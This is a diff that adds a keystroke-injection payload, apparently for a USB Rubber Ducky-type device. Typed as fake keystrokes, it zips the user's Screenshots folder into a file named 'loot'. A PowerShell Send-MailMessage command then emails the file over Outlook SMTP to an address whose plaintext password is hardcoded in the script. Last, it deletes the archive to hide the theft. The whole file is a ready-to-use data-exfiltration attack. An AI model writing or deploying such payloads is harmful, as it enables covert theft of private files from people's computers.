@@ -1,0 +1,45 @@
+DELAY 2000
+GUI r
+DELAY 200
+STRING %USERPROFILE%\Pictures\Screenshots
+ENTER
+DELAY 150
+MENU
+DELAY 150
+STRING o
+DELAY 150
+DOWNARROW
+DELAY 150
+ENTER
+DELAY 150
+SHIFT RIGHTARROW
+SHIFT RIGHTARROW
+SHIFT RIGHTARROW
+SHIFT RIGHTARROW
+DELAY 150
+MENU
+DELAY 150
+STRING n
+DELAY 200
+DOWNARROW
+DELAY 150
+ENTER
+DELAY 500
+STRING loot
+ENTER
+DELAY 150
+ALT F4
+DELAY 150
+GUI r
+DELAY 150
+STRING powershell
+ENTER
+DELAY 500
+STRING Send-MailMessage -From g00d137@outlook.com -To g00d137@outlook.com -Subject "Photo loot" -Body "Please find attached your zip file" -Attachment "Pictures\Screenshots\loot.zip" -SmtpServer smtp-mail.outlook.com -Port 587 -UseSsl -Credential (New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList g00d137@outlook.com, (ConvertTo-SecureString -String "1337credsinside" -AsPlainText -Force))
+ENTER
+DELAY 500
+STRING del Pictures\Screenshots\loot.zip
+ENTER
+DELAY 150
+STRING exit
+ENTER
